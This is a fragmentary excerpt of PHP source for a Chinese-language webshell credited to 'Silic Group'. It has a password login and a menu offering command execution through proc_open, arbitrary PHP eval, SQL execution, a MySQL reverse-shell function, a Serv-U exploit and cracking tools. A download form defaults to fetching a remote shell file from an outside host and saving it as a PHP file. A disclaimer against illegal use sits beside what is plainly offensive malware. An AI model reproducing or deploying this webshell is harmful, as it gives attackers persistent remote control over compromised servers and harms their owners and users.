...
$notice = "[<a href=\"http://www.blackbap.com\" title=\"Silic Group\">Silic Group</a>]\"><br><FONT color=#ff3300>声明:请勿使用本程序从事非法行为，否则后果自负！</font>";
/*===================== 配置结束 =====================*/
...
/*===================== 身份验证 =====================*/
if($admin['check'] == "1") {if ($_GET['action'] == "logout") {setcookie ("adminpass", "");echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$self."\">三秒后自动退出或单击这里退出程序界面 &gt;&gt;&gt;</a></span>";exit;}
if ($_POST['do'] == 'login') {$thepass=trim($_POST['adminpass']);if ($admin['pass'] == $thepass) {setcookie ("adminpass",$thepass,time()+(1*24*3600));echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$self."\">三秒后自动跳转或单击这里进入程序界面 &gt;&gt;&gt;</a></span>";exit;}}if (isset($_COOKIE['adminpass'])) {if ($_COOKIE['adminpass'] != $admin['pass']) {loginpage();}} else {loginpage();}}
/*===================== 验证结束 =====================*/
...
$tb->tdbody('| <a href="?action=logout">注销登录</a> | <a href="?action=dir">Shell 目录</a> | <a href="?action=phpenv">环境变量</a> | <a href="?action=proxy">在线代理</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | <a href="?action=crack">杂项破解</a> |');
$tb->tdbody('| <a href="?action=downloads">Http 文件下载</a> | <a href="?action=search&dir='.$dir.'">文件查找</a> | <a href="?action=eval">执行php脚本</a> | <a href="?action=sql">执行SQL语句</a> | <a href="?action=mysqlfun">Func反弹Shell</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="?action=SUExp">Serv-U EXP</a> | <a href="?action=mix">解压mix.dll</a> |');
$tb->tablefooter();
?>
...
elseif ($_GET['action'] == "shell") {
 ...
 if(isset($_POST['cmd'])) $cmd = $_POST['cmd'];
	...
	$tb->tdbody('proc_open函数要使用的cmd程序的位置:'.$tb->makeinput('cmd',$cmd,'','text','30').'(要是是linux系统自己修改吧)');
...
$action = '?action=dir';
	...
	$tb->tdbody('文件位置: '.$tb->makeinput('durl','http://www.blackbap.com/bbs/myshell.txt','','text','70').'<br>下载到:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','下载','','submit'),'center','1','35');
	echo "</form>";
...
elseif ($_GET['action'] == "proxy") {
	...
	$tb->tdbody('URL: '.$tb->makeinput('url','http://www.blackbap.com','','text','100').' '.$tb->makeinput('','浏览','','submit'),'center','1','40');
